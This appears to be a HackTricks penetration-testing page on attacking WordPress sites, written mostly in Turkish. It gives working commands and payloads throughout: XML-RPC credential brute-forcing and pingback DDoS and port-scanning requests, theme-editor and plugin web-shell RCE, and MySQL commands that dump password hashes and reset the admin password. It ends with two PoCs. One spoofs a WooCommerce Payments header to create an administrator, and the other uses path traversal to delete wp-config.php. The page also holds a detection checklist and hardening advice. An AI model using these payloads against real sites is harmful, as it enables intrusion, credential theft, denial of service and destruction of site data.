# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

- **Uploaded** dosyalarÄ± ÅŸuraya gider: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** bu yÃ¼zden tema iÃ§indeki bazÄ± php dosyalarÄ±nÄ± deÄŸiÅŸtirip RCE elde etmeye Ã§alÄ±ÅŸÄ±yorsanÄ±z muhtemelen bu yolu kullanÄ±rsÄ±nÄ±z. Ã–rneÄŸin: **theme twentytwelve** kullanarak **404.php** dosyasÄ±na ÅŸu konumdan **eriÅŸebilirsiniz**: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** veritabanÄ±nÄ±n root parolasÄ±nÄ± bulabilirsiniz.
- Kontrol edilecek varsayÄ±lan giriÅŸ yollarÄ±: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` yÃ¼klÃ¼ WordPress sÃ¼rÃ¼mÃ¼ gibi faydalÄ± bilgiler iÃ§erir.
- `wp-activate.php` yeni bir WordPress sitesi kurarken e-posta aktivasyon sÃ¼reci iÃ§in kullanÄ±lÄ±r.
- GiriÅŸ klasÃ¶rleri (gizlemek iÃ§in yeniden adlandÄ±rÄ±lmÄ±ÅŸ olabilir):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` HTTP'yi taÅŸÄ±ma mekanizmasÄ± ve XML'i kodlama mekanizmasÄ± olarak kullanarak veri iletimini saÄŸlayan WordPress Ã¶zelliÄŸini temsil eden bir dosyadÄ±r. Bu tÃ¼r iletiÅŸim WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ile deÄŸiÅŸtirilmiÅŸtir.
- `wp-content` klasÃ¶rÃ¼ eklentilerin ve temalarÄ±n saklandÄ±ÄŸÄ± ana dizindir.
- `wp-content/uploads/` platforma yÃ¼klenen dosyalarÄ±n saklandÄ±ÄŸÄ± dizindir.
- `wp-includes/` sertifikalar, fontlar, JavaScript dosyalarÄ± ve widget'lar gibi Ã§ekirdek dosyalarÄ±nÄ±n bulunduÄŸu dizindir.
- `wp-sitemap.xml` Wordpress sÃ¼rÃ¼mleri 5.5 ve Ã¼zeri iÃ§in tÃ¼m herkese aÃ§Ä±k yazÄ±lar ve herkese aÃ§Ä±k sorgulanabilir yazÄ± tipleri ile taksonomiler iÃ§eren bir sitemap XML dosyasÄ± oluÅŸturur.

**Post exploitation**

- `wp-config.php` dosyasÄ± WordPress'in veritabanÄ±na baÄŸlanmak iÃ§in ihtiyaÃ§ duyduÄŸu veritabanÄ± adÄ±, veritabanÄ± hostu, kullanÄ±cÄ± adÄ± ve parola, authentication keys ve salts, ve veritabanÄ± tablo Ã¶n eki gibi bilgileri iÃ§erir. Bu yapÄ±landÄ±rma dosyasÄ± ayrÄ±ca DEBUG modunu etkinleÅŸtirmek iÃ§in de kullanÄ±labilir; bu, sorun giderme sÄ±rasÄ±nda faydalÄ± olabilir.

### KullanÄ±cÄ± Yetkileri

- **YÃ¶netici**
- **EditÃ¶r**: Kendi ve baÅŸkalarÄ±nÄ±n yazÄ±larÄ±nÄ± yayÄ±nlar ve yÃ¶netir
- **Yazar**: Kendi yazÄ±larÄ±nÄ± yayÄ±nlar ve yÃ¶netir
- **KatkÄ±da Bulunan**: YazÄ±larÄ±nÄ± yazar ve yÃ¶netir ancak yayÄ±nlayamaz
- **Abone**: YazÄ±larÄ± gÃ¶rÃ¼ntÃ¼ler ve profilini dÃ¼zenler

## **Pasif KeÅŸif**

### **WordPress sÃ¼rÃ¼mÃ¼nÃ¼ Ã¶ÄŸrenme**

`/license.txt` veya `/readme.html` dosyalarÄ±nÄ± bulup bulamayacaÄŸÄ±nÄ±zÄ± kontrol edin.

SayfanÄ±n **kaynak kodu** iÃ§inde (Ã¶rnek: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link dosyalarÄ±

![](<../../images/image (533).png>)

- JavaScript dosyalarÄ±

![](<../../images/image (524).png>)

### Eklentileri Al
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### TemalarÄ± Al
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Genel olarak sÃ¼rÃ¼mleri Ã§Ä±karma
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktif keÅŸif

### Eklentiler ve Temalar

Muhtemelen tÃ¼m Eklentileri ve TemalarÄ± bulamayacaksÄ±nÄ±z. TÃ¼mÃ¼nÃ¼ keÅŸfetmek iÃ§in **aktif olarak Eklentiler ve Temalar listesini Brute Force etmeniz** gerekecek (umarÄ±m bu listeleri iÃ§eren otomatik araÃ§lar vardÄ±r).

### KullanÄ±cÄ±lar

- **ID Brute:** GeÃ§erli kullanÄ±cÄ±larÄ± bir WordPress sitesinden kullanÄ±cÄ± ID'lerini Brute Forcing yaparak elde edersiniz:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
EÄŸer yanÄ±tlar **200** veya **30X** ise, bu id'nin **geÃ§erli** olduÄŸu anlamÄ±na gelir. EÄŸer yanÄ±t **400** ise, id **geÃ§ersiz**dir.

- **wp-json:** KullanÄ±cÄ±lar hakkÄ±nda bilgi almak iÃ§in ÅŸu sorguyu deneyebilirsiniz:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
KullanÄ±cÄ±lar hakkÄ±nda bazÄ± bilgiler aÃ§Ä±ÄŸa Ã§Ä±karabilecek baÅŸka bir `/wp-json/` endpoint ÅŸudur:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Sadece bu Ã¶zelliÄŸi etkinleÅŸtirmiÅŸ kullanÄ±cÄ±lara ait bilgiler saÄŸlanacaktÄ±r**.

AyrÄ±ca **/wp-json/wp/v2/pages** IP adreslerini leak edebilir.

- **Login username enumeration**: **`/wp-login.php`**'ye giriÅŸ yaparken **mesaj** **farklÄ±dÄ±r**; bu **kullanÄ±cÄ± adÄ±nÄ±n var olup olmadÄ±ÄŸÄ±** bilgisini gÃ¶sterir.

### XML-RPC

EÄŸer `xml-rpc.php` aktifse credentials brute-force gerÃ§ekleÅŸtirebilir veya diÄŸer kaynaklara DoS saldÄ±rÄ±larÄ± baÅŸlatmak iÃ§in kullanabilirsiniz. (Ã–rneÄŸin bu sÃ¼reci[ using this](https://github.com/relarizky/wpxploit) ile otomatikleÅŸtirebilirsiniz).

Aktif olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in _**/xmlrpc.php**_ adresine eriÅŸmeyi deneyin ve bu isteÄŸi gÃ¶nderin:

**Kontrol**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** veya **`metaWeblog.getUsersBlogs`** credentials Ã¼zerinde brute-force yapmak iÃ§in kullanÄ±labilecek bazÄ± yÃ¶ntemlerdir. EÄŸer bunlardan herhangi birini bulursanÄ±z, ÅŸu gibi bir ÅŸey gÃ¶nderebilirsiniz:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Kimlik bilgileri geÃ§ersizse 200 kodlu yanÄ±tta _"YanlÄ±ÅŸ kullanÄ±cÄ± adÄ± veya parola"_ mesajÄ± gÃ¶rÃ¼nmelidir.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

DoÄŸru kimlik bilgilerini kullanarak bir dosya yÃ¼kleyebilirsiniz. YanÄ±tta yol ÅŸu ÅŸekilde gÃ¶rÃ¼necektir ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

This method is meant for programs and not for humans, and old, therefore it doesn't support 2FA. So, if you have valid creds but the main entrance is protected by 2FA, **you might be able to abuse xmlrpc.php to login with those creds bypassing 2FA**. Note that you won't be able to perform all the actions you can do through the console, but you might still be able to get to RCE as Ippsec explains it in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

EÄŸer **faultCode** deÄŸeri **0**'dan (17) **daha bÃ¼yÃ¼k** ise, bu portun aÃ§Ä±k olduÄŸu anlamÄ±na gelir.

Ã–nceki bÃ¶lÃ¼mde **`system.multicall`** kullanÄ±mÄ±na gÃ¶z atÄ±n; bu yÃ¶ntemi DDoS oluÅŸturmak iÃ§in nasÄ±l kÃ¶tÃ¼ye kullanacaÄŸÄ±nÄ±zÄ± Ã¶ÄŸrenin.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Bu dosya genellikle Wordpress sitesinin kÃ¶k dizininde bulunur: **`/wp-cron.php`**\
Bu dosya **eriÅŸildiÄŸinde** "**aÄŸÄ±r**" bir MySQL **query** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r; bu yÃ¼zden **attackers** bir **DoS** oluÅŸturmak iÃ§in bunu kullanabilir.\
AyrÄ±ca, varsayÄ±lan olarak, `wp-cron.php` her sayfa yÃ¼klenmesinde (bir client herhangi bir Wordpress sayfasÄ±nÄ± istediÄŸinde) Ã§aÄŸrÄ±lÄ±r; bu da yÃ¼ksek trafikli sitelerde sorunlara (DoS) yol aÃ§abilir.

Wp-Cron'un devre dÄ±ÅŸÄ± bÄ±rakÄ±lmasÄ± ve gereken iÅŸlemleri dÃ¼zenli aralÄ±klarla (sorun yaratmadan) gerÃ§ekleÅŸtirecek gerÃ§ek bir cronjob'un host Ã¼zerinde oluÅŸturulmasÄ± Ã¶nerilir.

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Wordpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Bu araÃ§ **methodName: pingback.ping** iÃ§in ve **/wp-json/oembed/1.0/proxy** path'i iÃ§in kontrol eder; eÄŸer mevcutsa onlarÄ± exploit etmeye Ã§alÄ±ÅŸÄ±r.

## Otomatik AraÃ§lar
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Bir biti deÄŸiÅŸtirerek eriÅŸim saÄŸlama

GerÃ§ek bir saldÄ±rÄ±dan Ã§ok bir merak konusu. CTF'de [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) herhangi bir wordpress dosyasÄ±ndaki 1 biti Ã§evirebiliyordunuz. Bu yÃ¼zden `/var/www/html/wp-includes/user.php` dosyasÄ±nÄ±n `5389` konumundaki biti NOP yaparak NOT (`!`) operasyonunu devre dÄ±ÅŸÄ± bÄ±rakabilirdiniz.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**KullanÄ±lan tema iÃ§indeki bir php dosyasÄ±nÄ± deÄŸiÅŸtirme (admin kimlik bilgileri gerekli)**

Appearance â†’ Theme Editor â†’ 404 Template (saÄŸda)

Ä°Ã§eriÄŸi bir php shell iÃ§in deÄŸiÅŸtirin:

![](<../../images/image (384).png>)

GÃ¼ncellenen sayfaya nasÄ±l eriÅŸileceÄŸini internette araÅŸtÄ±rÄ±n. Bu durumda ÅŸuraya eriÅŸmeniz gerekiyor: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Åunu kullanabilirsiniz:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
oturum elde etmek iÃ§in.

## Plugin RCE

### PHP plugin

.php dosyalarÄ±nÄ± bir plugin olarak yÃ¼klemek mÃ¼mkÃ¼n olabilir.\
Ã–rneÄŸin ÅŸu ÅŸekilde php backdoor oluÅŸturun:

![](<../../images/image (183).png>)

Sonra yeni bir plugin ekleyin:

![](<../../images/image (722).png>)

Plugin'i yÃ¼kleyin ve Install Now'a basÄ±n:

![](<../../images/image (249).png>)

Procced'e tÄ±klayÄ±n:

![](<../../images/image (70).png>)

Muhtemelen gÃ¶rÃ¼nÃ¼rde herhangi bir ÅŸey olmayacaktÄ±r, ancak Media'ya giderseniz shell'inizin yÃ¼klendiÄŸini gÃ¶receksiniz:

![](<../../images/image (462).png>)

EriÅŸin ve reverse shell'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in URL'yi gÃ¶receksiniz:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Bu yÃ¶ntem, bilinen zafiyete sahip kÃ¶tÃ¼ amaÃ§lÄ± bir plugin'in kurulmasÄ±nÄ± ve web shell elde etmek iÃ§in sÃ¶mÃ¼rÃ¼lmesini iÃ§erir. Bu sÃ¼reÃ§ WordPress dashboard'u Ã¼zerinden ÅŸu ÅŸekilde gerÃ§ekleÅŸtirilir:

1. **Plugin Acquisition**: Plugin, Exploit DB gibi bir kaynaktan edinilir; Ã¶rneÄŸin [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard'Ä±na gidin, ardÄ±ndan `Dashboard > Plugins > Upload Plugin` yolunu izleyin.
- Ä°ndirilen plugin'in zip dosyasÄ±nÄ± yÃ¼kleyin.
3. **Plugin Activation**: Plugin baÅŸarÄ±lÄ± ÅŸekilde yÃ¼klendikten sonra dashboard Ã¼zerinden etkinleÅŸtirilmelidir.
4. **Exploitation**:
- "reflex-gallery" plugin'i yÃ¼klendiÄŸinde ve etkinleÅŸtirildiÄŸinde, bilinen bir zafiyet nedeniyle sÃ¶mÃ¼rÃ¼lebilir.
- Metasploit framework bu zafiyet iÃ§in bir exploit sunar. Uygun modÃ¼lÃ¼ yÃ¼kleyip belirli komutlarÄ± Ã§alÄ±ÅŸtÄ±rarak bir meterpreter session kurulabilir ve siteye yetkisiz eriÅŸim saÄŸlanabilir.
- Bu, WordPress sitesini sÃ¶mÃ¼rmek iÃ§in kullanÄ±labilecek birÃ§ok yÃ¶ntemden sadece biridir.

Ä°Ã§erik, plugin'in yÃ¼klenmesi ve etkinleÅŸtirilmesi adÄ±mlarÄ±nÄ± gÃ¶steren WordPress dashboard gÃ¶rÃ¼ntÃ¼lerini iÃ§ermektedir. Ancak, bu ÅŸekilde zafiyetleri sÃ¶mÃ¼rmenin uygun yetki olmadan yasa dÄ±ÅŸÄ± ve etik dÄ±ÅŸÄ± olduÄŸunu unutmamak Ã¶nemlidir. Bu bilgi, yalnÄ±zca yetkili bir baÄŸlamda, Ã¶rneÄŸin aÃ§Ä±k izinli penetration testing gibi yasal Ã§erÃ§evede sorumlu ÅŸekilde kullanÄ±lmalÄ±dÄ±r.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ WordPress'te bir kullanÄ±cÄ± oluÅŸturur.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Ã–zel plugin'inizi (backdoor) WordPress'e yÃ¼kler.
- _**(RCE) Built-In Plugin Edit:**_ WordPress'teki Built-In Plugin'leri dÃ¼zenler.
- _**(RCE) Built-In Theme Edit:**_ WordPress'teki Built-In Theme'leri dÃ¼zenler.
- _**(Custom) Custom Exploits:**_ ÃœÃ§Ã¼ncÃ¼ taraf WordPress Plugin/Theme'leri iÃ§in Ã¶zel exploitler saÄŸlar.

## Post Exploitation

KullanÄ±cÄ± adlarÄ± ve parolalarÄ± Ã§Ä±kar:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin ÅŸifresini deÄŸiÅŸtir:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Eklentileri Pentest

### SaldÄ±rÄ± YÃ¼zeyi

Bir Wordpress eklentisinin iÅŸlevselliÄŸi nasÄ±l ortaya koyabildiÄŸini bilmek, o iÅŸlevsellikteki zafiyetleri bulmak iÃ§in kritiktir. Bir eklentinin iÅŸlevselliÄŸi nasÄ±l ortaya koyabileceÄŸini aÅŸaÄŸÄ±daki madde iÅŸaretlerinde bulabilirsiniz ve bazÄ± savunmasÄ±z eklenti Ã¶rnekleri iÃ§in [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) sayfasÄ±na bakÄ±n.

- **`wp_ajax`**

Bir eklentinin iÅŸlevlerini kullanÄ±cÄ±lara aÃ§masÄ±nÄ±n yollarÄ±ndan biri AJAX iÅŸleyicileri aracÄ±lÄ±ÄŸÄ±yladÄ±r. Bunlar mantÄ±k, authorization veya authentication hatalarÄ± iÃ§erebilir. AyrÄ±ca, bu iÅŸlevlerin sÄ±klÄ±kla hem authentication hem de authorization'Ä± bir Wordpress nonce'unun varlÄ±ÄŸÄ±na dayandÄ±rdÄ±ÄŸÄ±nÄ± gÃ¶rÃ¼rÃ¼z; bu nonce **Wordpress Ã¶rneÄŸinde kimliÄŸi doÄŸrulanmÄ±ÅŸ herhangi bir kullanÄ±cÄ±nÄ±n sahip olabileceÄŸi** (rolÃ¼nden baÄŸÄ±msÄ±z olarak) bir deÄŸerdir.

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` kullanÄ±mÄ± endpoint'e herhangi bir kullanÄ±cÄ± tarafÄ±ndan eriÅŸilebilir hale getirir (hatta kimlik doÄŸrulanmamÄ±ÅŸ kullanÄ±cÄ±lar dahil).**

> [!CAUTION]
> Ek olarak, eÄŸer fonksiyon sadece kullanÄ±cÄ±nÄ±n yetkilendirmesini `wp_verify_nonce` fonksiyonu ile kontrol ediyorsa, bu fonksiyon genellikle sadece kullanÄ±cÄ±nÄ±n oturum aÃ§mÄ±ÅŸ olduÄŸunu kontrol eder; kullanÄ±cÄ±nÄ±n rolÃ¼nÃ¼ genellikle kontrol etmez. Bu nedenle dÃ¼ÅŸÃ¼k yetkili kullanÄ±cÄ±lar yÃ¼ksek ayrÄ±calÄ±klÄ± iÅŸlemlere eriÅŸebilir.

- **REST API**

AyrÄ±ca WordPress'te fonksiyonlarÄ± `register_rest_route` fonksiyonunu kullanarak bir REST API kaydederek eriÅŸime aÃ§mak da mÃ¼mkÃ¼ndÃ¼r:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` belirli bir kullanÄ±cÄ±nÄ±n API yÃ¶ntemini Ã§aÄŸÄ±rmaya yetkili olup olmadÄ±ÄŸÄ±nÄ± kontrol eden bir callback fonksiyonudur.

**YerleÅŸik `__return_true` fonksiyonu kullanÄ±lÄ±rsa, kullanÄ±cÄ± izinleri kontrolÃ¼nÃ¼ basitÃ§e atlar.**

- **PHP dosyasÄ±na doÄŸrudan eriÅŸim**

Elbette, Wordpress PHP kullanÄ±r ve plugin iÃ§indeki dosyalar web Ã¼zerinden doÄŸrudan eriÅŸilebilir. Bu yÃ¼zden, bir plugin yalnÄ±zca dosyaya eriÅŸilerek tetiklenen herhangi bir savunmasÄ±z fonksiyonellik sunuyorsa, bu herhangi bir kullanÄ±cÄ± tarafÄ±ndan exploit edilebilir olacak.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

BazÄ± pluginler dahili entegrasyonlar veya reverse proxies iÃ§in â€œtrusted headerâ€ kÄ±sayollarÄ± uygular ve daha sonra REST istekleri iÃ§in mevcut kullanÄ±cÄ± baÄŸlamÄ±nÄ± ayarlamak iÃ§in bu header'Ä± kullanÄ±r. EÄŸer header upstream bir bileÅŸen tarafÄ±ndan kriptografik olarak isteÄŸe baÄŸlanmamÄ±ÅŸsa, bir saldÄ±rgan onu spoof yapabilir ve ayrÄ±calÄ±klÄ± REST rotalarÄ±na administrator olarak eriÅŸebilir.

- Etki: doÄŸrulanmamÄ±ÅŸ privilege escalation ile admin yetkisine yÃ¼kseltme â€” core users REST route Ã¼zerinden yeni bir administrator oluÅŸturarak.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (kullanÄ±cÄ± ID'si 1'i zorlar, genellikle ilk administrator hesabÄ±).
- Ä°stismar edilen rota: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Neden iÅŸe yarÄ±yor

- Eklenti, istemci tarafÄ±ndan kontrol edilen bir header'Ä± kimlik doÄŸrulama durumuna eÅŸleyip yetenek kontrollerini atlÄ±yor.
- WordPress core bu route iÃ§in `create_users` yeteneÄŸini bekler; eklenti hilesi header'dan doÄŸrudan current user context ayarlayarak bunu atlÄ±yor.

Beklenen baÅŸarÄ± gÃ¶stergeleri

- OluÅŸturulan kullanÄ±cÄ±yÄ± tanÄ±mlayan bir JSON gÃ¶vdesi ile HTTP 201.
- `wp-admin/users.php` iÃ§inde gÃ¶rÃ¼nen yeni bir admin kullanÄ±cÄ±.

Tespit kontrol listesi

- `getallheaders()`, `$_SERVER['HTTP_...']` veya Ã¶zel headerlarÄ± okuyup kullanÄ±cÄ± baÄŸlamÄ± ayarlayan vendor SDK'larÄ± (Ã¶r. `wp_set_current_user()`, `wp_set_auth_cookie()`) iÃ§in grep ile ara.
- Yetkisiz callback'lerin saÄŸlam `permission_callback` kontrolleri olmadan REST kayÄ±tlarÄ±nda kullanÄ±lÄ±p kullanÄ±lmadÄ±ÄŸÄ±nÄ± gÃ¶zden geÃ§ir ve bunun yerine request headerlarÄ±na gÃ¼venilip gÃ¼venilmediÄŸine bak.
- REST handler'larÄ± iÃ§inde yalnÄ±zca header deÄŸerleriyle kapatÄ±lmÄ±ÅŸ core kullanÄ±cÄ± yÃ¶netim fonksiyonlarÄ±nÄ±n (`wp_insert_user`, `wp_create_user`) kullanÄ±mÄ±na bak.

SertleÅŸtirme

- Kimlik doÄŸrulama veya yetkilendirmeyi istemci kontrollÃ¼ header'lardan tÃ¼retmeyin.
- EÄŸer bir reverse proxy kimlik enjekte etmek zorundaysa, gÃ¼veni proxynin kenarÄ±nda sonlandÄ±rÄ±n ve gelen kopyalarÄ± temizleyin (Ã¶r. kenarda `unset X-Wcpay-Platform-Checkout-User`), sonra imzalÄ± bir token ile iletin ve bunu server-side doÄŸrulayÄ±n.
- AyrÄ±calÄ±klÄ± iÅŸlemler yapan REST route'larÄ± iÃ§in `current_user_can()` kontrolleri ve katÄ± bir `permission_callback` zorunlu kÄ±lÄ±n (ASLA `__return_true` kullanmayÄ±n).
- Header â€œimpersonationâ€ yerine Ã¶ncelikle first-party auth (cookies, application passwords, OAuth) kullanÄ±n.

Referanslar: halka aÃ§Ä±k bir vaka ve daha geniÅŸ analiz iÃ§in bu sayfanÄ±n sonundaki baÄŸlantÄ±lara bakÄ±n.

### Kimlik doÄŸrulama olmadan rastgele dosya silme wp_ajax_nopriv aracÄ±lÄ±ÄŸÄ±yla (Litho Theme <= 3.0)

WordPress theme'leri ve plugin'leri sÄ±klÄ±kla `wp_ajax_` ve `wp_ajax_nopriv_` hook'larÄ± aracÄ±lÄ±ÄŸÄ±yla AJAX handler'larÄ± aÃ§Ä±ÄŸa Ã§Ä±karÄ±r. **_nopriv_** varyantÄ± kullanÄ±ldÄ±ÄŸÄ±nda **callback kimlik doÄŸrulamasÄ± olmayan ziyaretÃ§iler tarafÄ±ndan eriÅŸilebilir hale gelir**, bu yÃ¼zden herhangi bir hassas iÅŸlem ayrÄ±ca ÅŸunlarÄ± uygulamalÄ±dÄ±r:

1. Bir **capability check** (Ã¶rn. `current_user_can()` veya en azÄ±ndan `is_user_logged_in()`), ve
2. `check_ajax_referer()` / `wp_verify_nonce()` ile doÄŸrulanan bir **CSRF nonce**, ve
3. **SÄ±kÄ± input sanitizasyonu / validasyonu**.

Litho multipurpose theme (< 3.1) bu 3 kontrolÃ¼ *Remove Font Family* Ã¶zelliÄŸinde unutmuÅŸ ve sonuÃ§ olarak aÅŸaÄŸÄ±daki kodu (basitleÅŸtirilmiÅŸ) gÃ¶ndermiÅŸtir:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Bu kod parÃ§asÄ±nÄ±n yol aÃ§tÄ±ÄŸÄ± sorunlar:

* **YetkilendirilmemiÅŸ eriÅŸim** â€“ `wp_ajax_nopriv_` hook'u kayÄ±tlÄ±.
* **Nonce / capability check yok** â€“ herhangi bir ziyaretÃ§i endpoint'i Ã§aÄŸÄ±rabilir.
* **Yol temizleme (sanitisation) yok** â€“ kullanÄ±cÄ± kontrolÃ¼ndeki `fontfamily` string'i filtrelenmeden bir dosya sistemi yoluna ekleniyor; bu da klasik `../../` traversal'a izin veriyor.

#### Ä°stismar

Bir saldÄ±rgan tek bir HTTP POST isteÄŸi gÃ¶ndererek **uploads ana dizininin altÄ±ndaki** herhangi bir dosya veya dizini silebilir (normalde `<wp-root>/wp-content/uploads/`):
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
